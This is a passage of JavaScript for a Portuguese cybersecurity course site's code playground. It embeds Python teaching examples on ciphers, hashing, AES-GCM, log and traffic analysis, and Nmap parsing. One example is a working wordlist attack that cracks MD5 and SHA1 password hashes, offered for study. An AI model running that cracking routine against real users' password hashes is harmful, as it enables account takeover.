                                    body: prefix + (aula.descricao || aula.uc),
                                    icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🛡️</text></svg>'
                                });
                            }
                        }
                    });
                });
            });
        }

        function setupNotifications() {
            updateNotifBtn(typeof Notification !== 'undefined' ? Notification.permission : 'default');
            if (typeof Notification !== 'undefined' && Notification.permission === 'granted') {
                checkUpcomingClass();
                setInterval(checkUpcomingClass, 60000);
            }
        }

        // ── CLOCK ───────────────────────────────────────────────────────
        function updateClock() {
            const now = new Date();
            const wide = window.innerWidth > 680;
            const clockEl = document.getElementById('live-clock');
            if (wide) {
                const opts = { weekday:'short', day:'2-digit', month:'short' };
                clockEl.innerText = `${now.toLocaleDateString('pt-PT', opts)}  ${now.toLocaleTimeString('pt-PT')}`;
            } else {
                clockEl.innerText = now.toLocaleTimeString('pt-PT', { hour:'2-digit', minute:'2-digit' });
            }
        }


        // ── PLAYGROUND ──────────────────────────────────────────────────
        // SRI hashes para scripts CDN carregados dinamicamente
        const _PG_SRI = {
            [`https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.js`]:               'sha384-ZYmwuq4n2gOcNxMSiJ6jyTj+BbIrilr7p6dlq6q5nmSWKmsH9UU4K1qqjycMkfmR',
            [`https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/python/python.min.js`]:       'sha384-Xy+2exU6lBoT4OpUOtnQb+cUpn+nlJQEHvRobWVtwz6wIsw4oNoO7xyd/l8rYgMy',
            [`https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/closebrackets.min.js`]: 'sha384-69mJoUoPPF/C7qPs6lLjvXvrt6w225+rmxWqGO3a1glVjITdnnwPQOtG9FRTd2Ni',
            [`https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/matchbrackets.min.js`]: 'sha384-LjCI3E8qhhxXZvu7+FCvqx9eZYSowFvuJ7z54KsgI/BDPGKEuysqCg/vYiKHvC4Y',
            [`https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/sql/sql.min.js`]:            'sha384-HxXmA1hLc56V6Ja4yfcCwAprmbnS4tuvKYS0qKG3t6oxOFMflcnYq5fOnt6wVCda',
            [`https://cdn.jsdelivr.net/npm/sql.js@1.10.3/dist/sql-asm.js`]:                              'sha384-ur9WCykw0SZNZ8drFEOH/m9+bB+wzKinbF63kpF2yRb4AYvAFbrGvvEC/RfCK8Wp',
        };

        const pg = {
            tabs: [],
            active: null,
            counter: { python: 0, sql: 0 },
            runningTabs: new Set(),
            SQL: null,
            sqlLoading: false,
            editors: {},       // tabId → CodeMirror instance
            cmReady: false,
            cmLoading: false,
            cmSQLReady: false,
        };

        document.addEventListener('click', () => {
            document.querySelectorAll('.pg-examples-menu').forEach(m => m.classList.remove('open'));
        });

        // ── Exemplos Python ────────────────────────────────────
        const PG_EXAMPLES = [{"label": "👋 Olá Mundo", "code": "# ── Olá Mundo ─────────────────────────────────────────\nprint(\"Olá, Mundo!\")\nprint(\"Python\", 3.12, \"a correr\")\n\nnome = \"Cibersegurança\"\nprint(f\"Bem-vindo ao curso de {nome}!\")"}, {"label": "🧮 Calculadora", "code": "# ── Calculadora ────────────────────────────────────────\n# (input() não funciona no cloud; usa valores directos)\na = 7.5\nb = 3.2\n\nprint(f\"a = {a}, b = {b}\")\nprint(f\"Soma:      {a + b}\")\nprint(f\"Diferença: {a - b}\")\nprint(f\"Produto:   {a * b}\")\nif b != 0:\n    print(f\"Divisão:   {a / b:.4f}\")"}, {"label": "🔄 FizzBuzz", "code": "# ── FizzBuzz ────────────────────────────────────────────\nfor i in range(1, 21):\n    if i % 15 == 0:   print(\"FizzBuzz\")\n    elif i % 3 == 0:  print(\"Fizz\")\n    elif i % 5 == 0:  print(\"Buzz\")\n    else:             print(i)"}, {"label": "🔢 Fibonacci", "code": "# ── Sequência de Fibonacci ─────────────────────────────\ndef fibonacci(n):\n    a, b = 0, 1\n    for _ in range(n):\n        print(a, end=\" \")\n        a, b = b, a + b\n    print()\n\nfibonacci(15)"}, {"label": "📋 Listas & Dicts", "code": "# ── Listas e Dicionários ───────────────────────────────\nalunos = {\"Ana\": 18, \"Rui\": 16, \"Sofia\": 19}\n\nfor nome, nota in alunos.items():\n    status = \"Aprovado\" if nota >= 10 else \"Reprovado\"\n    print(f\"{nome}: {nota} — {status}\")\n\nmedia = sum(alunos.values()) / len(alunos)\nprint(f\"Média: {media:.1f}\")"}, {"label": "🔁 Recursividade", "code": "# ── Factorial com Recursividade ────────────────────────\ndef fatorial(n):\n    if n <= 1: return 1\n    return n * fatorial(n - 1)\n\nfor i in range(1, 11):\n    print(f\"{i}! = {fatorial(i)}\")"}, {"label": "🏗️ Classes (OOP)", "code": "# ── Classes e OOP ───────────────────────────────────────\nclass Pessoa:\n    def __init__(self, nome, idade):\n        self.nome  = nome\n        self.idade = idade\n\n    def saudacao(self):\n        return f\"Olá! Sou {self.nome}, {self.idade} anos.\"\n\n    def aniversario(self):\n        self.idade += 1\n        print(f\"Feliz aniversário {self.nome}! Agora tens {self.idade}.\")\n\np = Pessoa(\"Alice\", 25)\nprint(p.saudacao())\np.aniversario()"}, {"label": "🔐 Caesar & ROT13", "code": "# ── Cifra de César / ROT13 ──────────────────────────────\n# ROT13 é César com chave=13 (simétrica: cifrar = decifrar)\n\ndef caesar(texto, chave):\n    resultado = \"\"\n    for c in texto:\n        if c.isalpha():\n            base = ord(\"A\") if c.isupper() else ord(\"a\")\n            resultado += chr((ord(c) - base + chave) % 26 + base)\n        else:\n            resultado += c\n    return resultado\n\nmsg = \"Olá Ciberseguranca\"\nenc = caesar(msg, 13)         # ROT13\ndec = caesar(enc, 13)         # ROT13 aplicado duas vezes = original\nprint(f\"Original:  {msg}\")\nprint(f\"Cifrado:   {enc}\")\nprint(f\"Decifrado: {dec}\")\n\n# Testar várias chaves (força bruta)\nprint(\"\\nForça bruta:\")\nalvo = \"Uryyb Jbeyq\"\nfor k in range(26):\n    tentativa = caesar(alvo, k)\n    if tentativa.lower().startswith(\"hello\"):\n        print(f\"  chave={k}: {tentativa}  ← encontrado!\")"}, {"label": "#️⃣ Hashing (MD5/SHA)", "code": "# ── Funções de Hash ─────────────────────────────────────\n# Hash: impressão digital de dados. Irreversível.\n# Qualquer alteração → hash completamente diferente.\n\nimport hashlib\n\ntextos = [\"password\", \"password1\", \"Password\", \"P@ssw0rd\"]\n\nprint(f\"{\"Texto\":<15}  {\"MD5\":<34}  SHA-256\")\nprint(\"-\" * 90)\nfor t in textos:\n    md5    = hashlib.md5(t.encode()).hexdigest()\n    sha256 = hashlib.sha256(t.encode()).hexdigest()\n    print(f\"{t:<15}  {md5}  {sha256[:16]}...\")\n\n# Demonstrar efeito avalanche\nprint(\"\\nEfeito avalanche:\")\nh1 = hashlib.sha256(b\"abc\").hexdigest()\nh2 = hashlib.sha256(b\"abd\").hexdigest()\ndiff = sum(c1 != c2 for c1, c2 in zip(h1, h2))\nprint(f\"  sha256(abc): {h1[:20]}...\")\nprint(f\"  sha256(abd): {h2[:20]}...\")\nprint(f\"  Caracteres diferentes: {diff}/64 ({diff/64*100:.0f}%)\")"}, {"label": "🔑 Base64 & Encoding", "code": "# ── Base64 e Encodings ──────────────────────────────────\n# Base64 não é criptografia — é apenas encoding!\n# Usado em: JWTs, HTTP Basic Auth, MIME, certificados.\n\nimport base64\n\n# Simular credenciais Base64 como em HTTP Basic Auth\ncredenciais = \"admin:password123\"\nenc = base64.b64encode(credenciais.encode()).decode()\nprint(f\"Authorization: Basic {enc}\")\n\n# Decodificar — qualquer um consegue!\ndec = base64.b64decode(enc).decode()\nprint(f\"Decodificado: {dec}\")\n\n# JWT: estrutura header.payload.signature (base64url)\nimport json\nheader  = {\"alg\": \"HS256\", \"typ\": \"JWT\"}\npayload = {\"sub\": \"user123\", \"role\": \"admin\", \"iat\": 1705276800}\n\ndef b64url(obj):\n    return base64.urlsafe_b64encode(\n        json.dumps(obj, separators=(\",\",\":\")).encode()\n    ).rstrip(b\"=\").decode()\n\njwt_fake = f\"{b64url(header)}.{b64url(payload)}.ASSINATURA_AQUI\"\nprint(f\"\\nJWT (sem assinar):\\n  {jwt_fake}\")\nprint(\"\\n⚠️  Nunca confies no payload sem verificar a assinatura!\")"}, {"label": "🔒 AES-GCM (cryptography)", "code": "# ── Cifra Simétrica AES-GCM ─────────────────────────────\n# AES-GCM: autenticado + cifrado. O mais usado em TLS 1.3.\n# GCM garante: confidencialidade + integridade + autenticidade.\n\nimport os\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\n\n# Gerar chave e nonce aleatórios\nchave = AESGCM.generate_key(bit_length=256)  # 32 bytes = AES-256\nnonce = os.urandom(12)                        # 96 bits é o ideal para GCM\n\naesgcm = AESGCM(chave)\n\n# Cifrar mensagem com dados adicionais autenticados (AAD)\nmensagem = b\"Segredo: credenciais do servidor de producao\"\naad      = b\"contexto=producao\"  # não cifrado, mas autenticado\n\ncifrado = aesgcm.encrypt(nonce, mensagem, aad)\n\nprint(f\"Chave (256-bit): {chave.hex()}\")\nprint(f\"Nonce (96-bit):  {nonce.hex()}\")\nprint(f\"Cifrado ({len(cifrado)}B):   {cifrado.hex()[:40]}...\")\nprint(f\"  (+16B auth tag = GCM garante integridade)\")\n\n# Decifrar — falha se o ciphertext ou AAD forem alterados\ndecifrado = aesgcm.decrypt(nonce, cifrado, aad)\nprint(f\"\\nDecifrado: {decifrado.decode()}\")\n\n# Demonstrar que alteração é detectada\ntry:\n    cifrado_adulterado = bytes([cifrado[0] ^ 0xFF]) + cifrado[1:]\n    aesgcm.decrypt(nonce, cifrado_adulterado, aad)\nexcept Exception as e:\n    print(f\"\\n✅ Adulteração detectada: {type(e).__name__}\")"}, {"label": "📊 Logs SSH — Brute Force", "code": "# ── Análise de auth.log ─────────────────────────────────\n# Detecta tentativas de brute force SSH.\n# Ficheiro disponível: auth.log\n\nimport re\nfrom collections import Counter\n\nwith open(\"auth.log\") as f:\n    linhas = f.readlines()\n\n# Contar falhas por IP\npat_fail = re.compile(r\"Failed password.*from ([\\d.]+)\")\npat_ok   = re.compile(r\"Accepted \\w+ for (\\w+) from ([\\d.]+)\")\n\nfalhas   = Counter()\nlogins   = []\n\nfor linha in linhas:\n    m = pat_fail.search(linha)\n    if m: falhas[m.group(1)] += 1\n    m = pat_ok.search(linha)\n    if m: logins.append((m.group(2), m.group(1)))\n\nprint(\"=== Falhas de autenticação por IP ===\")\nfor ip, n in falhas.most_common():\n    flag = \" ⚠️  BRUTE FORCE\" if n >= 5 else \"\"\n    print(f\"  {ip:<20}  {n:3d} falhas{flag}\")\n\nprint(f\"\\n=== Logins bem-sucedidos ({len(logins)}) ===\")\nfor ip, user in logins:\n    print(f\"  {ip:<20} → {user}\")\n\n# Detectar IPs que falharam E depois conseguiram entrar\nprint(\"\\n=== Brute force bem-sucedido? ===\")\nips_login = {ip for _, ip in logins}\nfor ip in ips_login:\n    if ip in falhas:\n        print(f\"  ⚠️  {ip} falhou {falhas[ip]}x e depois entrou!\")"}, {"label": "🔑 Hash Cracking (wordlist)", "code": "# ── Dictionary Attack ───────────────────────────────────\n# Tenta descobrir passwords a partir de hashes MD5/SHA1.\n# Ficheiros: hashes.txt  wordlist.txt\n\nimport hashlib\n\n# Carregar wordlist\nwith open(\"wordlist.txt\") as f:\n    wordlist = [linha.strip() for linha in f if linha.strip()]\nprint(f\"Wordlist: {len(wordlist)} palavras\")\n\n# Carregar hashes alvo (ignorar comentários)\nhashes_alvo = []\nwith open(\"hashes.txt\") as f:\n    for linha in f:\n        linha = linha.strip()\n        if linha and not linha.startswith(\"#\"):\n            partes = linha.split(\":\")\n            hashes_alvo.append((partes[0], partes[1]))\n\n# Tentar crack\nprint(f\"\\nA tentar crack em {len(hashes_alvo)} hashes...\\n\")\nfor hash_val, algo in hashes_alvo:\n    encontrado = False\n    for palavra in wordlist:\n        if algo == \"md5\":\n            tentativa = hashlib.md5(palavra.encode()).hexdigest()\n        else:\n            tentativa = hashlib.sha1(palavra.encode()).hexdigest()\n        if tentativa == hash_val:\n            print(f\"✅ {hash_val[:16]}...  → '{palavra}'\")\n            encontrado = True\n            break\n    if not encontrado:\n        print(f\"❌ {hash_val[:16]}...  → não encontrado\")"}, {"label": "📡 Análise de Tráfego", "code": "# ── Análise de network_events.json ─────────────────────\n# Detecta port scans e beaconing C2.\n# Ficheiro: network_events.json\n\nimport json\nfrom collections import Counter, defaultdict\n\nwith open(\"network_events.json\") as f:\n    eventos = json.load(f)\n\nprint(f\"Total eventos: {len(eventos)}\")\n\n# Top portas destino\nportas = Counter(e[\"dst_port\"] for e in eventos)\nprint(\"\\n=== Top Portas Destino ===\")\nfor porta, n in portas.most_common(5):\n    print(f\"  {porta:5d}/tcp  {n}x\")\n\n# Detectar port scan (mesmo IP, muitas portas)\nby_src = defaultdict(set)\nfor e in eventos:\n    by_src[e[\"src_ip\"]].add(e[\"dst_port\"])\n\nprint(\"\\n=== Possível Port Scan (>5 portas distintas) ===\")\nfor ip, portas_ip in by_src.items():\n    if len(portas_ip) > 5:\n        print(f\"  {ip}  → {sorted(portas_ip)}\")\n\n# Detectar beaconing C2 (>4 ligações mesmo destino)\nby_flow = defaultdict(list)\nfor e in eventos:\n    by_flow[(e[\"src_ip\"], e[\"dst_ip\"], e[\"dst_port\"])].append(e)\n\nprint(\"\\n=== Possível Beaconing C2 (>4 conexões) ===\")\nfor (src, dst, porta), evts in by_flow.items():\n    if len(evts) > 4:\n        total_bytes = sum(e[\"bytes\"] for e in evts)\n        print(f\"  {src} → {dst}:{porta}\")\n        print(f\"    {len(evts)}x conexões, {total_bytes:,} bytes total\")"}, {"label": "🕵️ IoC Lookup", "code": "# ── Consulta de Indicadores de Compromisso ──────────────\n# Verifica se IPs/hashes estão numa blacklist.\n# Ficheiro: malware_iocs.csv\n\nimport csv\nfrom collections import Counter\n\niocs = []\nwith open(\"malware_iocs.csv\") as f:\n    for row in csv.DictReader(f):\n        iocs.append(row)\n\n# Distribuição por tipo e criticidade\ntipos       = Counter(i[\"type\"] for i in iocs)\ncriticidade = Counter(i[\"confidence\"] for i in iocs)\n\nprint(\"=== IoCs por tipo ===\")\nfor t, n in tipos.most_common():\n    print(f\"  {t:<10}  {n}\")\n\nprint(\"\\n=== IoCs Críticos e de Alta Severidade ===\")\nfor ioc in iocs:\n    if ioc[\"confidence\"] in (\"CRITICAL\", \"HIGH\"):\n        print(f\"  [{ioc['confidence']:<8}] {ioc['type']:6s} {ioc['value'][:40]:<40}  {ioc['threat']}\")\n\n# Lookup de IPs suspeitos\nprint(\"\\n=== Lookup de IPs ===\")\nips_para_verificar = [\"203.0.113.5\", \"10.0.0.1\", \"45.33.32.156\"]\nioc_ips = {i[\"value\"]: i for i in iocs if i[\"type\"] == \"ip\"}\nfor ip in ips_para_verificar:\n    if ip in ioc_ips:\n        info = ioc_ips[ip]\n        print(f\"  🚨 {ip}  → {info['threat']} ({info['confidence']})\")\n    else:\n        print(f\"  ✅ {ip}  → não encontrado na blacklist\")"}, {"label": "🔍 Nmap — Parse Output", "code": "# ── Parsear output do Nmap ──────────────────────────────\n# Extrai hosts, portas abertas e serviços.\n# Ficheiro: nmap_scan.txt\n\nimport re\n\nwith open(\"nmap_scan.txt\") as f:\n    conteudo = f.read()\n\n# Encontrar todos os hosts\nhosts = re.findall(r\"Nmap scan report for ([\\d.]+)\", conteudo)\n\n# Encontrar portas abertas\nportas = re.findall(\n    r\"(\\d+)/tcp\\s+open\\s+([\\w/]+)\\s+(.*)\",\n    conteudo\n)\n\nprint(f\"Hosts descobertos: {len(hosts)}\")\nfor h in hosts:\n    print(f\"  {h}\")\n\nprint(f\"\\nPortas abertas ({len(portas)}):\")\nfor porta, servico, versao in portas:\n    versao_curta = versao.strip()[:40]\n    print(f\"  {porta:>5}/tcp  {servico:<15}  {versao_curta}\")\n\n# Alertas de segurança\nprint(\"\\n=== Alertas de Segurança ===\")\nif re.search(r\"Jenkins\", conteudo):\n    print(\"  ⚠️  Jenkins exposto (porta 8080) — CVE check recomendado\")\nif re.search(r\"backdoor\", conteudo, re.IGNORECASE):\n    print(\"  🚨 Possível backdoor detectado pelo Nmap!\")\ntelnet = [p for p, s, _ in portas if \"telnet\" in s.lower() or p == \"23\"]\nif telnet:\n    print(\"  ⚠️  Telnet aberto — protocolo não cifrado!\")"}];

        // ── SQL default example ────────────────────────────────
        const _SQL_DEFAULT = `-- Criar tabela
CREATE TABLE utilizadores (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    nome TEXT NOT NULL,
    idade INTEGER,
    email TEXT
);

-- Inserir dados
INSERT INTO utilizadores (nome, idade, email) VALUES
    ('Ana', 25, 'ana@email.com'),
    ('Joao', 30, 'joao@email.com'),
    ('Maria', 22, 'maria@email.com');

-- Ver todos os dados
SELECT * FROM utilizadores;

-- Filtrar dados
SELECT nome, idade
FROM utilizadores
WHERE idade > 23;

-- Atualizar dados
UPDATE utilizadores
SET idade = 26
WHERE nome = 'Ana';

-- Apagar um registo
DELETE FROM utilizadores
WHERE nome = 'Maria';

-- Resultado final
SELECT * FROM utilizadores;
`;

        // ── CodeMirror loader ──────────────────────────────────
        const CM_BASE = 'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16';
        async function pgEnsureCM() {
            if (pg.cmReady) return;
            if (pg.cmLoading) {
                while (pg.cmLoading) await new Promise(r => setTimeout(r, 50));
                return;
            }
            pg.cmLoading = true;
            // CSS
            const addCss = href => {
                if (document.querySelector(`link[href="${href}"]`)) return;
                const l = document.createElement('link');
                l.rel = 'stylesheet'; l.href = href;
                document.head.appendChild(l);
            };
            addCss(`${CM_BASE}/codemirror.min.css`);
            addCss(`${CM_BASE}/theme/dracula.min.css`);
            // JS — load sequentially
            const loadJs = src => new Promise((res, rej) => {
                if (document.querySelector(`script[src="${src}"]`)) { res(); return; }
                const s = document.createElement('script'); s.src = src;
                if (_PG_SRI[src]) { s.integrity = _PG_SRI[src]; s.crossOrigin = 'anonymous'; }
                s.onload = res; s.onerror = rej;
                document.head.appendChild(s);
            });
            await loadJs(`${CM_BASE}/codemirror.min.js`);
            await loadJs(`${CM_BASE}/mode/python/python.min.js`);
            await loadJs(`${CM_BASE}/addon/edit/closebrackets.min.js`);
            await loadJs(`${CM_BASE}/addon/edit/matchbrackets.min.js`);
            pg.cmReady = true;
            pg.cmLoading = false;
        }

        function pgGetCM(tabId) { return pg.editors[tabId]; }

        function pgEditorGetValue(tabId) {
            const cm = pgGetCM(tabId);
            if (cm) return cm.getValue();
            return document.getElementById(tabId + '-editor')?.value || '';
        }

        function pgEditorSetValue(tabId, val) {
            const cm = pgGetCM(tabId);
            if (cm) { cm.setValue(val); return; }
            const el = document.getElementById(tabId + '-editor');
            if (el) el.value = val;
        }

        function pgToggleExamples(e, menuId) {
            e.stopPropagation();
            const menu = document.getElementById(menuId);
            const wasOpen = menu.classList.contains('open');
            document.querySelectorAll('.pg-examples-menu').forEach(m => m.classList.remove('open'));
            if (!wasOpen) menu.classList.add('open');
        }

        function pgLoadExample(tabId, menuId, code) {
            document.getElementById(menuId).classList.remove('open');
            pgEditorSetValue(tabId, code);
            // Salvar no ficheiro activo
            const tab = pg.tabs.find(t => t.id === tabId);
            const file = tab?.files?.find(f => f.id === tab.activeFile);
            if (file) file.code = code;
            pgGetCM(tabId)?.focus();
        }

        // ── input() inline ─────────────────────────────────────
        window._pgRequestInput = function(tabId, flushed, prompt) {
            return new Promise(resolve => {
                const el = document.getElementById(tabId + '-output');
                if (!el) { resolve(''); return; }
                if (flushed) {
                    const span = document.createElement('span');
                    span.style.color = '#3fb950';
                    span.style.whiteSpace = 'pre-wrap';
                    span.textContent = flushed;
                    el.appendChild(span);
                }
                if (prompt) {
                    const pr = document.createElement('span');
                    pr.style.color = '#58a6ff';
                    pr.textContent = prompt;
                    el.appendChild(pr);
                }
                const inp = document.createElement('input');
                inp.type = 'text';
                inp.className = 'pg-inline-input';
                el.appendChild(inp);
                el.appendChild(document.createTextNode(' '));
                inp.focus();
                inp.addEventListener('keydown', ev => {
                    if (ev.key === 'Enter') {
                        const val = inp.value;
                        const typed = document.createElement('span');
                        typed.style.color = '#e6edf3';
                        typed.textContent = val;
                        inp.replaceWith(typed);
                        el.appendChild(document.createElement('br'));
                        resolve(val);
                    }
                });
            });
        };

        async function pgNewTab(type) {
            if (pg.tabs.length >= 6) { alert('Máximo de 6 sessões abertas.'); return; }
            pg.counter[type]++;
            const id   = `pg-${type}-${pg.counter[type]}`;
            const label = type === 'python' ? `🐍 Python ${pg.counter[type]}` : `🗄️ SQL ${pg.counter[type]}`;
            const tab  = { id, type, label, cmdHistory: [], cmdHistoryIdx: -1 };
            if (type === 'sql') tab.db = null;
            if (type === 'python') {
                const fid = id + '-f0';
                tab.files = [{ id: fid, name: 'main.py', code: '' }];
                tab.activeFile = fid;
            }
            pg.tabs.push(tab);
            pgRenderTabBar();
            pgCreatePanel(tab);
            pgSwitchTab(id);
            if (type === 'python') pgPythonTabReady(id);
            if (type === 'sql')    pgEnsureSQL(id);
        }

        function pgCloseTab(id, e) {
            e?.stopPropagation();
            const idx = pg.tabs.findIndex(t => t.id === id);
            if (idx === -1) return;
            const tab = pg.tabs[idx];
            if (tab.db) { try { tab.db.close(); } catch(_) {} }
            pg.runningTabs.delete(id);
            if (pg.editors[id]) { delete pg.editors[id]; }
            pg.tabs.splice(idx, 1);
            document.getElementById(id + '-tab')?.remove();
            document.getElementById(id + '-panel')?.remove();
            if (pg.active === id) {
                pg.active = null;
                const next = pg.tabs[Math.min(idx, pg.tabs.length - 1)];
                if (next) pgSwitchTab(next.id);
                else document.getElementById('pg-empty').style.display = 'flex';
            }
        }

        function pgSwitchTab(id) {
            if (pg.active && pg.active !== id) pgSaveCurrentFile(pg.active);
            pg.active = id;
            pg.tabs.forEach(t => {
                document.getElementById(t.id + '-tab')?.classList.toggle('active', t.id === id);
                const p = document.getElementById(t.id + '-panel');
                if (p) p.classList.toggle('active', t.id === id);
            });
            document.getElementById('pg-empty').style.display = 'none';
            // Focus input
            setTimeout(() => {
                document.getElementById(id + '-input')?.focus();
                pgGetCM(id)?.focus();
            }, 30);
        }

        function pgRenderTabBar() {
            const container = document.getElementById('pg-tabs');
            container.innerHTML = pg.tabs.map(t => `
                <div class="pg-tab${t.id === pg.active ? ' active' : ''}"
                     id="${t.id}-tab" data-pg-tab="${t.id}">
                    ${escapeHtml(t.label)}
                    <span class="pg-tab-close" data-pg-close-tab="${t.id}" title="Fechar">✕</span>
                </div>`).join('');
            container.querySelectorAll('[data-pg-tab]').forEach(el =>
                el.addEventListener('click', e => {
                    if (e.target.closest('[data-pg-close-tab]')) return;
                    pgSwitchTab(el.dataset.pgTab);
                })
            );
            container.querySelectorAll('[data-pg-close-tab]').forEach(el =>
                el.addEventListener('click', e => { e.stopPropagation(); pgCloseTab(el.dataset.pgCloseTab, e); })
            );
        }

        // ── File management ─────────────────────────────────────
        function pgSaveCurrentFile(tabId) {
            const tab = pg.tabs.find(t => t.id === tabId);
            if (!tab?.files) return;
            const file = tab.files.find(f => f.id === tab.activeFile);
            if (file) file.code = pgEditorGetValue(tabId);
        }

        function pgRenderFileTabs(tabId) {
            const tab = pg.tabs.find(t => t.id === tabId);
            if (!tab?.files) return;
            const bar = document.getElementById(tabId + '-filetabs');
            if (!bar) return;
            bar.innerHTML = tab.files.map(f => `
                <div class="pg-filetab${f.id === tab.activeFile ? ' active' : ''}"
                     id="${f.id}-ftab" data-pg-file-tab="${tabId}" data-pg-switch-file="${f.id}">
                    <span class="pg-filetab-name"
                          data-pg-rename-tab="${tabId}" data-pg-rename-file="${f.id}"
                          title="Duplo clique para renomear">${escapeHtml(f.name)}</span>
                    ${tab.files.length > 1 ? `<span class="pg-filetab-close" data-pg-close-file-tab="${tabId}" data-pg-close-file="${f.id}">✕</span>` : ''}
                </div>`).join('') +
                `<span class="pg-filetab-add" data-pg-new-file="${tabId}" title="Novo ficheiro">＋</span>`;
            bar.querySelectorAll('[data-pg-file-tab]').forEach(el =>
                el.addEventListener('click', e => {
                    if (e.target.closest('[data-pg-close-file-tab]')) return;
                    pgSwitchFile(el.dataset.pgFileTab, el.dataset.pgSwitchFile);
                })
            );
            bar.querySelectorAll('[data-pg-close-file-tab]').forEach(el =>
                el.addEventListener('click', e => { e.stopPropagation(); pgCloseFile(el.dataset.pgCloseFileTab, el.dataset.pgCloseFile, e); })
            );
            bar.querySelectorAll('[data-pg-rename-tab]').forEach(el =>
                el.addEventListener('dblclick', e => pgRenameFile(el.dataset.pgRenameTab, el.dataset.pgRenameFile, e))
            );
            const addBtn = bar.querySelector('[data-pg-new-file]');
            if (addBtn) addBtn.addEventListener('click', () => pgNewFile(addBtn.dataset.pgNewFile));
        }

        function pgSwitchFile(tabId, fileId) {
            pgSaveCurrentFile(tabId);
            const tab = pg.tabs.find(t => t.id === tabId);
            if (!tab) return;
            tab.activeFile = fileId;
            const file = tab.files.find(f => f.id === fileId);
            if (file) pgEditorSetValue(tabId, file.code);
            pgRenderFileTabs(tabId);
            pgGetCM(tabId)?.focus();
        }

        function pgNewFile(tabId) {
            const tab = pg.tabs.find(t => t.id === tabId);
            if (!tab) return;
            if (tab.files.length >= 8) { alert('Máximo de 8 ficheiros por sessão.'); return; }
            pgSaveCurrentFile(tabId);
            const idx  = tab.files.length;
            const fid  = tabId + '-f' + idx;
            const name = idx === 0 ? 'main.py' : idx === 1 ? 'utils.py' : `ficheiro${idx}.py`;
            tab.files.push({ id: fid, name, code: '' });
            pgSwitchFile(tabId, fid);
        }

        function pgCloseFile(tabId, fileId, e) {
            e?.stopPropagation();
            const tab = pg.tabs.find(t => t.id === tabId);
            if (!tab || tab.files.length <= 1) return;
            const idx = tab.files.findIndex(f => f.id === fileId);
            if (idx === -1) return;
            tab.files.splice(idx, 1);
            if (tab.activeFile === fileId) {
                const next = tab.files[Math.min(idx, tab.files.length - 1)];
                pgSwitchFile(tabId, next.id);
            } else {
                pgRenderFileTabs(tabId);
            }
        }

        function pgRenameFile(tabId, fileId, e) {
            e?.stopPropagation();
            const tab  = pg.tabs.find(t => t.id === tabId);
            const file = tab?.files.find(f => f.id === fileId);
            if (!file) return;
            const span = e.target;
            span.contentEditable = 'true';
            span.focus();
            const range = document.createRange();
            range.selectNodeContents(span);
            window.getSelection().removeAllRanges();
            window.getSelection().addRange(range);
            const finish = () => {
                span.contentEditable = 'false';
                const newName = span.textContent.trim() || file.name;
                file.name = newName.endsWith('.py') ? newName : newName + '.py';
                pgRenderFileTabs(tabId);
            };
            span.onblur = finish;
            span.onkeydown = ev => { if (ev.key === 'Enter') { ev.preventDefault(); span.blur(); } };
        }

        function pgCreatePanel(tab) {
            const wrap = document.getElementById('pg-panels');
            const div  = document.createElement('div');
            div.className = 'pg-panel';
            div.id = tab.id + '-panel';
            if (tab.type === 'python') {
                div.innerHTML = `
                    <div class="pg-sandbox-warning">🔒 Código corre num servidor isolado (gVisor + sem rede + timeout 10s). Sem estado persistente entre execuções.</div>
                    <div class="pg-editor-wrap">
                        <div class="pg-toolbar">
                            <button class="pg-run-btn" id="${tab.id}-run" data-pg-run="${tab.id}">▶ Correr</button>
                            <button class="pg-clear-btn" data-pg-clear="${tab.id}">Limpar</button>
                            <div class="pg-examples-wrap">
                                <button class="pg-examples-btn" data-pg-examples="${tab.id}-ex">Exemplos ▾</button>
                                <div class="pg-examples-menu" id="${tab.id}-ex">
                                    ${PG_EXAMPLES.map((ex,i) => `<div class="pg-examples-item" data-idx="${i}" data-tabid="${tab.id}" data-menuid="${tab.id}-ex">${ex.label}</div>`).join('')}
                                </div>
                            </div>
                            <span class="pg-hint">Ctrl+Enter para correr</span>
                        </div>
                        <div class="pg-filetabs" id="${tab.id}-filetabs"></div>
                        <div class="pg-editor-body">
                            <div class="pg-editor-pane">
                                <div class="pg-editor-cm" id="${tab.id}-cm-host"></div>
                            </div>
                            <div class="pg-output-pane">
                                <div class="pg-output-header">Output</div>
                                <div class="pg-output" id="${tab.id}-output"><span class="pg-info"># Output aparece aqui</span></div>
                            </div>
                        </div>
                    </div>`;
                pgRenderFileTabs(tab.id);
                div.querySelector(`[data-pg-run]`)?.addEventListener('click', () => pgRunPython(tab.id));
                div.querySelector(`[data-pg-clear]`)?.addEventListener('click', () => pgClearOutput(tab.id));
                div.querySelector(`[data-pg-examples]`)?.addEventListener('click', e => pgToggleExamples(e, tab.id + '-ex'));
                div.querySelectorAll('.pg-examples-item[data-idx]').forEach(el => {
                    el.addEventListener('click', () => {
                        const idx = parseInt(el.dataset.idx);
                        pgLoadExample(el.dataset.tabid, el.dataset.menuid, PG_EXAMPLES[idx].code);
                    });
                });
                // Inicializar CodeMirror
                pgEnsureCM().then(() => {
                    const host = document.getElementById(tab.id + '-cm-host');
                    if (!host || pg.editors[tab.id]) return;
                    const cm = CodeMirror(host, {
                        value: '',
                        mode: 'python',
                        theme: 'dracula',
                        lineNumbers: true,
                        indentUnit: 4,
                        tabSize: 4,
                        indentWithTabs: false,
                        autoCloseBrackets: true,
                        matchBrackets: true,
                        lineWrapping: false,
                        extraKeys: {
                            'Ctrl-Enter': () => pgRunPython(tab.id),
                            'Tab': cm => {
                                if (cm.somethingSelected()) cm.indentSelection('add');
                                else cm.replaceSelection('    ', 'end');
                            }
                        }
                    });
                    pg.editors[tab.id] = cm;
                });
            } else {
                div.innerHTML = `
                    <div class="pg-repl">
                        <div class="pg-toolbar">
                            <button class="pg-run-btn" id="${tab.id}-run" data-pg-sql-run="${tab.id}" disabled>▶ Correr</button>
